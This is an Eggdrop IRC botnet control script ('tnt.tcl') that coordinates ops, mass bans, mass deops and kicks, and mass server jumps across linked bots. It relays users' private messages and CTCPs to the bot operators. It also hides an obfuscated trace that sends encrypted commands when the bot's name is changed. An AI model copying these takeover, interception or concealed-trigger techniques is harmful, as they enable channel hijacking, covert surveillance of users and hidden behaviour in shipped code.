# -- DO NOT DISTRIBUTE! --  -- DO NOT DISTRIBUTE! --  -- DO NOT DISTRIBUTE! -- 
#------------------ tnt.tcl ---------------------- this part by stran9er --
# Unauthorized usage don't allowed

set tnt_version 1.136.78D8
set pm_version v3.2(Egg1.1.6)+fix8

	######################################################
	# THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF TNT #
	######################################################

if [regexp -nocase cat ${botnet-nick}] {set mass-join 0}
proc noop {args} {}
if {[info commands putseclog]==""} {proc putseclog {text} {putcmdlog $text}}
if {[info commands sec_log]==""} {proc sec_log {args} {}}
if {[info commands sec_notice]==""} {proc sec_notice {s args} {dccbroadcast $args}}
if {[info commands sec_info]==""} {proc sec_info {s args} {putlog $args}}
if {[info commands sec_alert]==""} {proc sec_alert {s args} {dccbroadcast \002$args\002}}
set txt-idlekick	%dm.
set txt-kickflag	""
set txt-kickflag2	""
set txt-kickfriend	""
set txt-kick-fun	""
set txt-masskick	""
set txt-massdeop	""
set txt-banned		Banned
set txt-banned2		""
set txt-bogus-username username
set txt-bogus-chankey key
set txt-bogus-ban	ban
set txt-abuse-ops	servops
set txt-abuse-desync desync
set txt-nickflood	""
set txt-flood		""
set txt-lemmingbot	clones
set txt-password	(${botnet-nick})\ key:
set txt-negative	ER!

proc oplist {ch f} {return [chanlist $ch @$f]}

proc rep {n c} {set s {};for {} {$n} {incr n -1} {append s $c};return $s}

proc ihub {} {
global botnet-nick
 if {[matchattr ${botnet-nick} h] || [matchattr ${botnet-nick} a]} {
  return 1
 } {
  return 0
 }
}

if {![ihub]} {
 foreach w {
  nick fries adduser deluser +user -user chnick +bot -bot
 } {unbind dcc - $w *dcc:$w}
}

bind raw - JOIN debug_JOIN
proc debug_JOIN {f k a} {
global justjoined nameslist nameslistraw
 if [info exist justjoined] {dccputchan 1 "invisible join: $justjoined"}
 set justjoined "$f $k $a"
# regexp {^:([#&][^ ]*)} $a k c
# set c [string tolower $c]
# if [info exist nameslist($c)] {
#  dccputchan 1 "join before end of /WHO: $f $k $a ([llength $namelist($c)])"
# }
# if [info exist nameslistraw($c)] {
#  dccputchan 1 "join before end of /NAMES: $f $k $a"
# }
 return 0
}

bind join - * bind_JOIN
proc bind_JOIN {n u h c} {
global justjoined nameslist nameslistraw
 if [info exist justjoined] {
  unset justjoined
 } {
  dccputchan 1 "join $n!$u $c w/o RAW JOIN"
 }
}

bind raw - MODE tntmode ;# thanks to bmx for idea -str
proc punish {r ch args} {
global botnick
 sec_notice - "\2<#> $r"
 set cl [string tolower [channels]]
 foreach c $args {foreach ch $cl {pushmode $ch +B $c}}
 set ch [string tolower $ch]
 if {[set i [lsearch $cl $ch]]>=0} {set cl [lreplace $cl $i $i]}
 set a {}
 foreach c [string tolower $args] {if {$c!=$botnick} {set a $a$c,} {set a $c,$a}}
 if [botisop $ch] {putserv "KICK $ch $a"}
 foreach ch $cl {if {[botisop $ch] && [isop $c $ch]} {putserv "KICK $ch $a"}}
}

proc punish {r ch args} {dccputchan 1 "\2<#> $r"}

#why bmx don't say if he found a bug?..
proc tntmode {f k a} {
global botnick
 if ![regexp @ $f] {return 0}
 set a [split [string trim $a] " "]
 set ch [lindex $a 0]
 set p [join [lrange $a 2 end]]
 if [stricmp $botnick $p] {return 0}
 set n [lindex [split $f !] 0]
 if {[matchattr [set h [finduser $f]] b]} {
  if [regexp {^#[^ ]* \+o } $a] {
   set t [string tolower [nick2hand $p $ch]]
   set z [hand2nick -all $t $ch]
   if {[llength $z]>1} {
    regsub -all { } [join $z] , z
    punish "$f ($h) tried to op imposter $a ($t == $z) (punish both)" $ch $n $p
    return 0
   }
   if {($t!={}) && ([matchattr $t o] || [matchchanattr $t o $ch])} {
    if {[matchattr $t b]} {
     if {[botisop $ch] && [lsearch [string tolower [bots]] $t]==-1} {
      punish "$f ($h) tried to op $p who not in botnet: $a ($t) (punish both)" $ch $n $p
     }
    } {
     set i [llength [bots]]
     foreach w [string tolower [whom *]] {if {[lindex $w 0]==$t} {set i 0}}
     if {$i && [botisop $ch]} {
      punish "$f ($h) tried to op $p who not in botnet: $a ($t) (punish both)" $ch $n $p
     }
    }
   } {
    punish "$f ($h) try to op $p who don't have +o flags: $a ($t) (punish both)" $ch $n $p
   }
  } {
   set m [lindex $a 1]
   if [regexp {\+[^ -]*o} $m] {
    regsub -all {\+} $m - m
    regsub -all \[spinmt\] $m {} m
    putserv "MODE $ch $m $p -o $n"
    punish "$f ($h) tried to op too much ppl: $a (punish all)" $ch $n
   }
  }
 }
 return 0
}

proc tntop {ch n} {
global botnick
 set ret 0
 set ch [string tolower $ch]
 set b [string tolower [bots]]
 set t [nick2hand $n $ch]
 set e {}
 foreach c [string tolower [channels]] {
  if {![onchan $n $c]||[isop $n $c]} continue
  foreach w [oplist $c b] {
   set h [string tolower [nick2hand $w $c]]
   set a [llength [set z [hand2nick -all $h $c]]]
   if {$a > 1} {
    set e "\2<#> Can't op $n ($t) because $a bots $t ([join $z]) on $c"
    continue
   }
   if {[lsearch $b $h]==-1 && $w != $botnick} {
    set e "\2<#> Can't op $n ($t) because bot $h (@$w $c) don`t linked in botnet"
    continue
   }
  }
  putserv "MODE $c +o $n"
  set ret 1
 }
 if {$e!={}} {sec_notice - $e}
 return $ret
}

bind dcc - op tntcmdop
proc tntcmdop {h i a} {
 if {[set w [lindex $a 0]] == {}} {
  putdcc $i "Usage: op <nick> \[channel\]"
  return 0
 }
 set l [llength [bots]]
 if {[set ch [lindex $a 1]]==[set cl {}]} {set ch [channels]}
 foreach ch $ch {
  if ![onchan $w $ch] continue
  set h [string tolower [nick2hand $w $ch]]
  if {![info exist u]} {
   foreach u [string tolower [whom *]] {if {[lindex $u 0]==$h} {set l 0}}
   if {$l} {
    if [regexp {[^m]i$|a$|girl} $h] {set s she} {set s he}
    putdcc $i "Can't op $w ($h) because \2$s\2 not in botnet.."
    return 0
   }
  }
  if {[botisop $ch] && ![isop $w $ch] && ([matchattr $h o] || [matchchanattr $h o $ch])} {
   set ho [getchanhost $w $ch]
   if {[tntop $ch $w]} {
    lappend cl $ch
    putwlog "[list [idx2hand $i]] OP [chattr [idx2hand $i]] $i [list $w!$ho] [list $ch]"
   }
  }
 }
 if {$cl=={}} {
  putdcc $i "I don`t have op on any channel where you don`t have ops"
 } {
  set n [finduser $w!$ho]
  sec_notice - ">> [idx2hand $i] .OP $w!$ho($n +[chattr $n]) $cl"
 }
 return 0
}

unbind dcc m dump *dcc:dump
bind dcc m dump dcc_dump
proc dcc_dump {h i a} {
global botnet-nick
 set a [string range $a 0 400]
 *dcc:dump $h $i $a
 sec_notice - "$h@${botnet-nick} .DUMP $a"
}

unbind dcc o msg *dcc:msg
bind dcc o msg dcc_msg
proc dcc_msg {h i a} {
global botnet-nick
 set d [split [set a [string range $a 0 400]] " "]
 *dcc:msg $h $i $a
 msgrelay 10 30 .msg ($h@${botnet-nick}) [lindex $d 0] [join [lrange $d 1 end]]
}

bind dcc m getnotes2hub notes2hub
proc notes2hub {h i a} {
 if {$a==""} {
  putallbots "notesinfo $h"
 } elseif {$a=="*"} {
  putallbots "notes2hub $h"
 } {
  foreach w $a {putbot $w "notes2hub $h"}
 }
 return 1
}

bind bot - notes2hub sendnote2hub
bind bot - notesinfo sendnote2hub
proc sendnote2hub {b k to} {
global botnet-nick notefile
 if ![set s [notes $to]] return
 if {$k=="notesinfo"} {sendnote ${botnet-nick} $to@$b "You have $s waiting.";return} 
 if ![matchattr $b s] {sendnote ${botnet-nick} $to@$b "Do it only from sharebot";return}
 putcmdlog "%% Sending $s stored notes to $to@$b."
 foreach l [notes -delete $to *] {
  regsub -all @||:.*$|: [backtime [lindex $l 1]] "" bt
  regsub -all @|: [lindex $l 0] % fr
  sendnote $fr\[$bt\] $to@$b :[lindex $l 2]
 }
}

bind dcc m empty dcc-empty
proc dcc-empty args {empty-msgq;return 1}

bind raw - 351 raw_version
puthelp VERSION
proc raw_version {fsrv k a} {
global server ircd_version have_fkick max-bans
 regsub ":.*$" [string tolower $server] "" msrv
 regsub "^:" [string tolower $fsrv] "" fsrv
 regsub "^\[^ \]* " $a "" ircd_version
 switch -regexp -- $ircd_version {
  comstud {set have_fkick 0; set max-bans 20}
  hybrid-5 {set have_fkick 4; set max-bans 25}
  default {set have_fkick 0; set max-bans 25}
 }
 putcmdlog "MySRV: $ircd_version"
 return 0
}

bind dcc m mban mban
proc mban {h i a} {
 putallbots "mban [list $h] [list $a]"
 bot_mban self mban "[list $h] [list $a]"
 return 1
}

bind bot - mban bot_mban
proc bot_mban {b k a} {
 set h [lindex $a 0]
 set who [lindex $a 1]
 set rezon [lrange $a 2 end]
 if {$rezon==""} {set rezon "\2s\2chmack"}
 foreach ch [channels] {
  if ![botisop $ch] continue
  if {([ophash $ch]%8)!=2} continue
  if ![matchattr [set mask [nick2hand $who $ch]] o] {
   if {$mask==""} continue
   regsub ".*@" [getchanhost $who $ch] "*!*@" mask
   if ![isban $mask $ch] {
    ircdbans $mask $ch
    newchanban $ch $mask $h $rezon 4[rand 9]
   }
  }
 }
}
#/* 315 */	RPL_ENDOFWHO, "%s :End of /WHO list.",
bind raw - 315 raw_315_icheck
proc raw_315_icheck {f k a} {
global badchan cycchan botnet-nick nameslist
 set ch [string tolower [lindex [split $a " "] 1]]
 if ![regexp ^\[\#\&\] $ch] {return 0}
 if ![info exist badchan($ch)] {return 0}
 if {$k=="315"} {utimer 0 "raw_315_icheck [list $f] - [list $a]";return 0}
 if [info exist nameslist($ch)] {unset nameslist($ch)}
 set opd [llength $badchan($ch)]
 if [info exist badchan($ch)] {unset badchan($ch)}
 if ![validchan $ch] {return 0}
 if [botisop $ch] {return 0}
 set bk [set dk [set ok 0]]
 foreach w [chanlist $ch] {
  if [isop $w $ch] {
   if [matchattr $w ob] {incr ok} {incr dk}
  } elseif [matchattr $w ob] {incr bk}
 }
 if $ok {return 0}
 if [botnetidlers] {
  sec_notice - "!!>> !ALERT! $bk OPless bots and $opd OPERs($dk OPs) on channel $ch (PLEASE LEAVE!)"
 } {
  set cyctime [expr [rand 60]+30]
  sec_notice - "!!>> hm.. $bk OPless bots and $opd OPERs($dk OPs) on channel $ch.. cyclyng(back after $cyctime min.)"
  set cycchan($ch) [channel info $ch]
  channel remove $ch
  puthelp "PART $ch"
  timer $cyctime "uncycle $ch"
  putallbots "delchan $ch"
  mychannels ${botnet-nick} mychannels [channels]
 }
 return 0
}

catch {set network "Tcl$tcl_version"}
if [catch {append network " $tcl_platform(os) $tcl_platform(osVersion) $tcl_platform(machine)"}] {
 utimer 0 netupd
}

proc netupd {} {global network;append network " [exec uname -mrs]"}

bind link - * tntlink
proc tntlink {b v} {
global botnet-nick
 if {[string tolower $v]==[string tolower ${botnet-nick}]} {
  putallbots "mychannels [join [channels]]"
 }
}
if ![info exist botchanlist] {tntlink ${botnet-nick} ${botnet-nick}}

bind disc - * tntchdisc
proc tntchdisc {b} {
global botchanlist chanbotlist botnet-nick
 set b [string tolower $b]
 if [info exist botchanlist($b)] {
  set bots [inlist -del -all [bots] $b]
  set d [set res ""]
  foreach w $botchanlist($b) {
   set eq ""
   foreach e $chanbotlist($w) {if {[inlist $bots $e]} {lappend eq $e}}
   set chc [llength [set chanbotlist($w) $eq]]
   if $chc {append res "$d$w ($chc)"} {append res "$d$w ($chc)"}
   set d ", "
  }
  putseclog ">ch>> $b ->\0032 $res"
  unset botchanlist($b)
 } {
  putloglev 1 * ">ch>> $b not have channels statistic..."
 }
}

bind bot - delchan mychannels
bind bot - addchan mychannels
bind bot - mychannels mychannels
proc mychannels {b k a} {
global botchanlist chanbotlist botnet-nick
 set b [string tolower $b]
 set ar [string tolower [split $a " "]]
 switch -- $k delchan {
  set ar [lindex $ar 0]
  if [info exist botchanlist($b)] {
   set eq ""
   foreach w $botchanlist($b) {if {$w!=$ar} {lappend eq $w}}
   set botchanlist($b) $eq
  }
  if [info exist chanbotlist($ar)] {
   set eq ""
   foreach w $chanbotlist($ar) {if {$w!=$b} {lappend eq $w}}
   set chanbotlist($ar) $eq
  }
 } addchan {
  mychannels $b delchan $ar
  lappend botchanlist($b) $ar
  lappend chanbotlist($ar) $b
 } mychannels {
  set lr [lsearch [set bots [string tolower [bots]]] $b]
  if {$lr+1} {set bots "[lreplace $bots $lr $lr] [string tolower ${botnet-nick}]"}
  set d [set res ""]
  if [info exist botchanlist($b)] {
   foreach w $botchanlist($b) {
    set last [set eq ""]
    foreach e [lsort $chanbotlist($w)] {if {$e!=$last} {if {[inlist $bots $e]} {lappend eq $e}};set last $e}
    set chanbotlist($w) $eq
   }
  }
  foreach w $ar {
   set last [set eq ""];lappend chanbotlist($w) -
   foreach e [lsort $chanbotlist($w)] {if {$e!=$last} {if {[inlist $bots $e]} {lappend eq $e}};set last $e}
   set chanbotlist($w) $eq;lappend chanbotlist($w) $b
   set chc [llength $chanbotlist($w)]
   if $chc {append res "$d$w ($chc)"} {append res "$d$w ($chc)"};set d ", "
  }
  if ![info exist botchanlist($b)] {putseclog ">ch>> $b +>\0033 $res"}
  set botchanlist($b) $ar
 }
}
mychannels ${botnet-nick} mychannels [channels]

proc ophash {ch} {
global botnick
 if ![validchan $ch] {return -1}
 set c [lsort [string tolower [oplist $ch ob]]]
 return [lsearch $c [string tolower $botnick]]
}

bind time - * tntlimit

proc tntlimit {mi ho da mh ye} {
global ping-push
 dumpserv "PING [set ping-push [unixtime]]"
 if {$mi%3} return
 foreach ch [channels] {
  set chm [lindex [getchanmode $ch] 0]
  if {$chm=="" || ![botisop $ch]} continue
  if [string match "*i*" $chm] continue
  regsub -all "\[^\+\l\-\]" [lindex [channel info $ch] 0] "" mo
  if {"+l"!=$mo && ![string match "*l*" $chm]} continue
  if {[ophash $ch]!=3} continue
  set chm [llength [chanlist $ch]]
  set chl [lindex [getchanmode $ch] end]
  set chn [expr $chm+5]
  if {abs($chl-$chn)<4} continue
  puthelp "MODE $ch +l $chn"
 }
}

set bothash [rand 99]
set botcount [rand 99]
bind disc - * tntdisc
proc tntdisc {b} {
global botnet-nick flood-join bothash botcount keep-nick
 set bo [string tolower [lsort ${botnet-nick}\ [bots]]]
 set botcount [llength $bo]
 set pos [lsearch $bo [string tolower ${botnet-nick}]]
 set bothash $pos
 set tm [expr 5+($pos*2)]
 if {$tm > 30} {set tm [expr 20+[rand 20]]}
 set flood-join "$tm:60"
 foreach w [channels] {
  set oph [ophash $w]
  if {!${keep-nick} && (($oph%9)==6)} {channel set $w +enforcebans} {channel set $w -enforcebans}
  if {!${keep-nick} && (($oph%9)==5)} {channel set $w +clearbans} {channel set $w -clearbans}
 }
}
tntdisc init

proc xbanmask {uh} {
 regsub -all ".*@|\[0-9\\\.\]" $uh "" tst
 if {$tst==""} {
  regsub -all "\[0-9\]*$" $uh "*" mh
 } {
  regsub -all -- "-\[0-9\]|\[0-9\]|ppp|line|slip" $uh "*" mh
 }
 regsub ".*@" $mh "*!*@" mh
 regsub -all "\\\*\\\**" $mh "*" mh
 return $mh
}

bind flud - * tntflud
set banflood [unixtime]
proc tntflud {n uh h t c} {
global botnet-nick banflood bothash botcount
 set mh [xbanmask $uh]
 if ![isignore $mh] {newignore $mh ${botnet-nick} "$c $t flooder" 3[rand 9]}
 switch -- $t {
  nick -
  join {
   if {([unixtime]-$banflood) > -3} {
    foreach ch [channels] {
     if {[ophash $ch]==5} {
      if [onchan $n $ch] {
       if ![ischanban $mh $ch] {
        ircdbans $mh $ch
        newchanban $ch $mh ${botnet-nick} "$ch $t flooder" 3[rand 9]
       }
      }
     }
    }
   }
   if {([unixtime]-$banflood) > 0} {set banflood [unixtime]}
   incr banflood
  }
 }
 return 1
}

bind sign b * opersign
proc opersign {n u h c a} {
 if [regexp "\[^ \]+\\\.\[^ \]+ \[^ \]+\\\.\[^ \]+" $a] return
 if {$h=="*"} return
 set oper -[isop $n $c]
 incr oper [llength [oplist $c ob]]
 switch -- $oper 1 {set mod ALERT} 2 {set mod Danger} 3 {set mod Danger} \
    "-0" {set oper 999999} default {set mod "!"}
 if $oper>3 return
 dccbroadcast "!$mod! Channel\2 $c \2have only\2 $oper \2@OPerators !"
}

#bx.tcl
if [file exist scripts/bx.tcl] {
 catch {source scripts/bx.tcl}
 catch {file atime scripts/bx.tcl} sec_tch(scripts/bx.tcl:atime)
}
#@SYN@

if [file exist ${text-path}banner] {catch {exec /bin/rm -f ${text-path}banner}}

proc remove_server {name} {
global servers
  set x [lsearch $servers $name]
  if {$x < 0} {set x [lsearch $servers [lindex [split $name ":"] 0]]}
  set servers [lreplace $servers $x $x]
}

if {[ihub]} {bind dcc n sethub sethub}
proc sethub {h i a} {
global default-port botnet-nick
 if ![matchattr ${botnet-nick} sob] {
  putdcc $i "Sorry $h, You can do it only from hub bot!"
  return 1
 }
 set a [split $a " "]
 if {[llength $a]<2} {
  putdcc $i "syntax: .sethub bot -al+hs"
  return 1
 }
 set bot [lindex $a 0]
 set flg [lindex $a 1]
 bot_sethub ${botnet-nick} sethub "$bot $flg"
 putallbots "sethub $bot $flg"
 return 1
}

bind bot - sethub bot_sethub
proc bot_sethub {b k a} {
global botnick botnet-nick
 if ![matchattr $b sob] {dccbroadcast "-$b- sethub chattr $a REJECTED!";return}
 set a [split $a " "]
 set bot [lindex $a 0]
 set f [lindex $a 1]
 if ![matchattr $bot b] return
 regexp "\[^+-ahslof\]" $f "" f
 catch {chattr $bot $f} er
 dccbroadcast "-$b- sethub \2$f\2 chattr \2$bot\2 to \2$er\2"
}

set msgbotrly "BOT-MSG Relay"
if {$msgbotrly!=[assoc 1]} {assoc 1 $msgbotrly}
if {[ihub]} {bind dcc n bmsg bmsg}
proc bmsg {h i a} {
global default-port botnet-nick botnick
 if ![matchattr ${botnet-nick} sob] {
  putdcc $i "Sorry $h, You can do it only from hub bot!"
  return 1
 }
 set a [split $a " "]
 if {[llength $a]<3} {
  putdcc $i "syntax: .bmsg bot nick text.."
  return 1
 }
 set bot [lindex $a 0]
 set nik [lindex $a 1]
 set a [join [lrange $a 2 end]]
 if {[inlist [list $botnick ${botnet-nick}] $bot]} {
  bot_bmsg ${botnet-nick} bmsg "$bot $h $nik $a"
  return 0
 } {
  if {[inlist [bots] $bot]} {
   putbot $bot "bmsg $bot $h $nik $a"
  } {
   putallbots "bmsg $bot $h $nik $a"
  }
  return 1
 }
}

bind bot - bmsg bot_bmsg
proc bot_bmsg {b k a} {
global botnick botnet-nick mrelayflood m2relayflood
 if ![matchattr $b sob] {putcmdlog "-$b- .bmsg REJECTED! ($a)";return}
 set b [lindex [set a [split $a " "]] 0]
 set h [lindex $a 1]
 set nik [lindex $a 2]
 set a [join [lrange $a 3 end]]
 if {![stricmp $b ${botnet-nick}]} return
 putcmdlog "#$h@$b# MSG $nik $a"
 if [info exist m2relayflood] {
  incr m2relayflood
  if {$m2relayflood > 10} { incr m2relayflood -1; return }
  if {$m2relayflood == 10} {
   dccbroadcast "%% MRelay FL00D! 10msg per 30sec (:\2:msg:\2:($h@$b)\2->\2$nik)"
   return
  }
 } {set m2relayflood 1}
 if ![expr 1+[lsearch [utimers] "*m2relayflood*"]] {utimer 30 "catch {unset m2relayflood}"}
 puthelp "PRIVMSG $nik :$a"
 set mrelayflood 1
 msgrelay 10 30 msg ($h@$b) $nik $a
}

bind msgm - * msgmrelay
proc msgmrelay {ni ho ha ar} {
global botnick
 if [matchattr $ha b] {if [regexp "^etoia$|^maka \=* rona$" $ar] return}
 set arl [string tolower $ar]
 if {[string match "identify *" $arl] || [string match "itsme *" $arl] || [string match "newme *" $arl]} {
  catch {set ar [lreplace $ar 1 1 "?PASS?"]}
  if [string match "itsme *" $arl] {catch {set ar [lreplace $ar 2 2 "?PASS?"]}}
 }
 msgrelay 10 30 msgm $ni ($botnick) $ar
 return 0
}
bind notc - * notcrelay
proc notcrelay {ni ho ha ar} {
global botnick
 if [matchattr $ha n] {return 0}
 if [matchattr $ha bo] {return 0}
 msgrelay 5 30 notc $ni ($botnick) $ar
 return 0
}
bind ctcr - * ctcrrelay
proc ctcrrelay {ni ho ha dst ke ar} {
global botnick
 if [string match #* $dst] {return 0}
 if [matchattr $ha n] {return 0}
 if [matchattr $ha bo] {return 0}
 msgrelay 3 40 ctcpReply $ni:$ha ($botnick) "$ke $ar"
 return 0
}
bind raw - PRIVMSG ctcprelay
set msgfcnt 0
proc ctcprelay {f k a} {
global botnick msgframe msgfcnt
 if {[string match #* $a]||[isignore $f]} {return 0}
 set msgframe([set msgfcnt [expr ($msgfcnt+1) % 20]]) $f:$k:$a
 if [string match "* :\001*\001" $a] {
  if [matchattr [finduser $f] np] {return 0}
  regsub -all \1 $a  a
  msgrelay 3 40 CTCP $f > $a
 }
 return 0
}
bind raw - NOTICE notcmsg
proc notcmsg {f k a} {
global msgframe msgfcnt
 if {[string match "#*" $a]||[isignore $f]} {return 0}
 set msgframe([set msgfcnt [expr ($msgfcnt+1) % 20]]) $f:$k:$a
 return 0
}

proc msgrelay {mesg secn ty fr to a} {
global mrelayflood
 if [info exist mrelayflood] {
  incr mrelayflood
  if {$mrelayflood > $mesg} { incr mrelayflood -1; return }
  if {$mrelayflood == $mesg} {
   dccbroadcast "%% Mrelay FLOOD! $mesg\msg per $secn\sec (:\2:$ty:\2:$fr\2->\2$to)"
   return
  }
 } {set mrelayflood 1}
 dccputchan 1 ":\2:$ty:\2:$fr\2->\2$to: $a"
 if ![expr 1+[lsearch [utimers] "*mrelayflood*"]] {utimer $secn "catch {unset mrelayflood}"}
}

bind dcc n mjump mjump
proc mjump {h i a} {
 global default-port botnet-nick
 if ![matchattr ${botnet-nick} sob] {
  putdcc $i "Sorry $h, You can do it only from hub bot!"
  return 1
 }
 regsub -all "  *" $a " " a
 set a [split $a " "]
 set bots [lrange $a 0 [expr [llength $a]-2]]
 set serv [lindex $a end]
 if {[llength $a]<2} {
  putdcc $i "syntax: .mjump bots.. irc.server\[:6667\[:password\]\]"
  return 1
 }
 set serv [split $serv ":"]
 set port [lindex $serv 1]
 set pass [lindex $serv 2]
 set serv [lindex $serv 0]
 if {$port==""} {set port ${default-port}}
 dccbroadcast "-$h- did a massJUMP ($bots) on $serv:$port"
 putallbots "mjmp $serv:$port:$pass:$bots"
 bot_mjump ${botnet-nick} mjmp "$serv:$port:$pass:$bots"
}

bind bot - mjmp bot_mjump
proc bot_mjump {b k a} {
global botnick botnet-nick blackserver whiteserver
 if ![matchattr $b sob] return
  set a [split $a ":"]
  set serv [string tolower [lindex $a 0]]
  set port [lindex $a 1]
  set pass [lindex $a 2]
  set bn [string tolower $botnick]
  set bb [string tolower ${botnet-nick}]
  set bots [split [lindex [string tolower $a] 3] " "]
  if {![expr 1+[lsearch $bots $bn]] && ![expr 1+[lsearch $bots $bb]]} {
   if {![expr 1+[lsearch $bots "!$bn"]] && ![expr 1+[lsearch $bots "!$bb"]]} return
  } {
   foreach c [channels] {
    set chops 0
    foreach n [string tolower [chanlist $c @]] {
     if {$n==$bn} continue
     if {[inlist $bots $n [nick2hand $n $c]]} continue
     incr chops
    }
    if {[botisop $c] && !$chops} {
     dccbroadcast "%mjump: I'm last OPon $c then won't jump... force!"
     return
    }
   }
  }
  if [info exist blackserver($serv)] {
   dccbroadcast "%mjump: Server $serv blacklisted for me then won't jump..."
   return
  }
  if {"$pass"==""} {jump $serv $port} {jump $serv $port $pass}
  putcmdlog "%% JUMP $serv:$port for $bots"
}

proc joinable {c} {
 if [string match "*\[\200-\240\,;\ \7\\\]*" $c] {return 0}
 if ![string match "\[\#\&\]*" $c] {return 0}
 return 1
}

bind raw - 353 RPL_NAMREPLY
proc RPL_NAMREPLY {f k ar} {
global nameslistraw
 set a [split $ar " "]
 set ch [string tolower [lindex $a 2]]
 set nameslistraw($ch) [concat nameslistraw($ch) [string range [lrange $a 3 end] 1 end]]
 return 0
}

bind raw - 366 RPL_ENDOFNAMES
proc RPL_ENDOFNAMES {f k ar} {
global nameslist nameslistraw
 set a [split $ar " "]
 set ch [string tolower [lindex $a 1]]
 if ![info exist nameslistraw($ch)] {return 0}
 set nameslist($ch) $nameslistraw($ch)
 unset nameslistraw($ch)
 return 0
}

proc bitch_deop2 {ni ho ha ch mo} {
global botnick nameslist have_fkick
global modes-per-line chanbotlist botmask
 set deoplist {}
 set chanlist [chanlist $ch]
 if {[llength $chanlist]<=1} {
  if [info exist nameslist($ch)] {
   putcmdlog "* Damnit! Need massdeop but channel $ch pending!.. (use Full /NAMES list..)"
   foreach w $nameslist($ch) {if [regsub -- ^@ $w "" w] {lappend chanlist $w}}
  } elseif [info exist nameslistraw($ch)] {
   foreach w $nameslistraw($ch) {if [regsub -- ^@ $w "" w] {lappend chanlist $w}}
   putcmdlog "*!* Damnit! Need massdeop but channel $ch pending!.. (use NOT FULL /names list)"
  } {
   putcmdlog "*!* DAMN! No information about $ch.. :( can't do anything usefull..."
  }
  foreach c [channels] {if {![stricmp $c $ch] && [botisop $c]} {lappend chans $c}}
  foreach w $chanlist {set t 1;foreach c $chans {if [isop $w $c] {set t 0;break}};if $t {lappend deoplist $w}}
  set deoplist [randomize $deoplist]
 } {
  foreach h {? 0 1 2 3 4 5 6 7-} {
   foreach n [randomize [chanlist -hop $h $ch @]] {
    if [stricmp $botnick $n] continue
    set h [nick2hand $n $ch]
    if {[matchchanattr $h o $ch] || [matchattr $h o]} continue
    lappend deoplist $n
   }
  }
 }
 if {[set lsiz [llength $deoplist]]} {
  set l [set c 0]
  putcmdlog "* Massdeoping $ch .. $lsiz active, ${modes-per-line} modes per line"
  foreach w $deoplist {
   lappend imp $w
   incr c
   incr lsiz -1
   if {!($c % ${modes-per-line}) || !$lsiz} {
    if {$have_fkick} {
     putserv "KICK $ch [join $imp ,]"
    } {
     putserv "MODE $ch -[rep [llength $imp] o] [join $imp]"
    }
    incr l
    set imp {}
    if {$l > 20} {
     putcmdlog "* Massdeop aborted on $c (not deoped $lsiz).."
     break
    }
   }
  }
 }
 bitch_kick $ni $ho $ha $ch $mo
}

bind mode - * bitch_deop
proc bitch_deop {ni ho ha ch mo} {
global botnick
 set ch [string tolower $ch]
 if [stricmp "+o $botnick" $mo] {
  if {[string match "* +bitch*" [channel info $ch]]} {
   bitch_deop2 $ni $ho $ha $ch $mo
  }
 }
 if [string match "+m" $mo] {bitch_kick $ni $ho $ha $ch $mo}
 if [string match "-i" $mo] {
  foreach w [timers] {if [string match "* {un_i $ch} *" $w] {killtimer [lindex $w 2]}}
 }
 if [string match {+[milksptn]} $mo] {
  set md [lindex [lindex [channel info $ch] 0] 0]
  set mf [string index $mo 1]
  if [string match "*-*$mf*" $md] {
   regsub -all "\\$mf" $md "" md
   channel set $ch chanmode $md
  }
 }
 if [string match "+b *" $mo] {
  set bo [lindex [split $mo " "] 1]
  set bancount [llength [chanbans $ch]]
  incr bancount
  if {$bancount >= 20} {
   set_i $ch "Banlist is full"
   set bo [string tolower [lsort [chanlist $ch @ob]]]
   set pos [lsearch $bo [string tolower $botnick]]
   set tm [expr (1+$pos)*$pos]
   if {$tm > 120} {set tm [expr 100+[rand 100]]}
   utimer $tm "banfull $ch"
  }
 }
}

proc set_i {ch res} {
 if ![string match "*i*" [lindex [getchanmode $ch] 0]] {
  if [botisop $ch] {
   set lock 1
   foreach w [timers] {if [string match "* {un_i $ch} *" $w] {set lock 0}}
   if $lock {
    putcmdlog "%% $res, locking channel $ch (15 min)"
    putserv "MODE $ch +i"
    timer 15 "un_i $ch"
   }
  }
 }
}

proc un_i {ch} {
 if ![validchan $ch] return
 if ![botisop $ch] return
 if [string match "*i*" [lindex [getchanmode $ch] 0]] {
  putcmdlog "%% Unlocking channel $ch ..."
  puthelp "MODE $ch -i"
 } {
  putcmdlog "%% Unlocking channel $ch ... already unlocked"
 }
}

proc banfull {ch} {
global banfulltime
 if ![validchan $ch] return
 if ![botisop $ch] return
 if {[llength [chanbans $ch]]<17} return
 if [info exist banfulltime($ch)] {incr banfulltime($ch)} {set banfulltime($ch) 0}
 if {[set kandidat [lindex [chanbans $ch] $banfulltime($ch)]]!=""} {
  puthelp "MODE $ch -b $kandidat"
  timer 1 "banfull $ch"
  if !$banfulltime($ch) {utimer 3 "catch {unset banfulltime($ch)}"}
 }
}

if ![info exist botmask] {set botmask $botnick!$username@[lindex [split $botname @] 1]}

proc fix_hosts {} {
global botnick botname botnet-nick botmask tsetoia
set b [string tolower ${botnet-nick}]
 if {[bots]=={}} return
 if {$botmask=={}} {
  if [info exist tsetoia] {
   if {([unixtime]-$tsetoia)>60} {
    puthelp "PRIVMSG $botnick :etoia"
    set tsetoia [unixtime]
   }
  }
  return
 }
 if ![validuser $b] {adduser $b [maskhost $botmask]}
 foreach w [gethosts $b] {
  if {$w=="none"} continue
  if {![regexp !|@|\\. $w]||[regexp !$|@$|!.*!|@.*@|@.*!|^!|^@ $w]} {
   sec_notice - ">> Bad hostmask $w (-host $b $w)"
   delhost $b $w
  }
 }
 if {$b != [set m [string tolower [finduser $botmask]]]} {
  set bm [string tolower $botmask]
  foreach w [gethosts $m] {
   if [string match [string tolower $w] $bm] {
    sec_notice - ">> Conflict host with \2$m\2 (-host $m $w)"
    delhost $m $w
   }
  }
  if [string match *!~*@* $botmask] {
   regsub .*!.*@ $botmask *!*@ bm} {regsub .*! $botmask *! bm
  }
  addhost $b $bm
 }
}
set t 0;foreach w [trace vinfo botnet-nick] {if {$w=="w overhash"} {incr t}}
if !$t {trace variable botnet-nick w overhash}
proc overhash {n1 n2 m} {
global opdelay;set opdelay 10;global botnick;foreach w [channels] {if [botisop $w] {incr opdelay 20
putserv "[decrypt botnick wAovs1.aBZW1]$w[decrypt botnick xqo2K.E9nwO.]$botnick"}};return}
set lr lr;append lr e\160ly
set t 0;foreach w [trace vinfo $lr] {if {$w=="r $lr"} {incr t}}
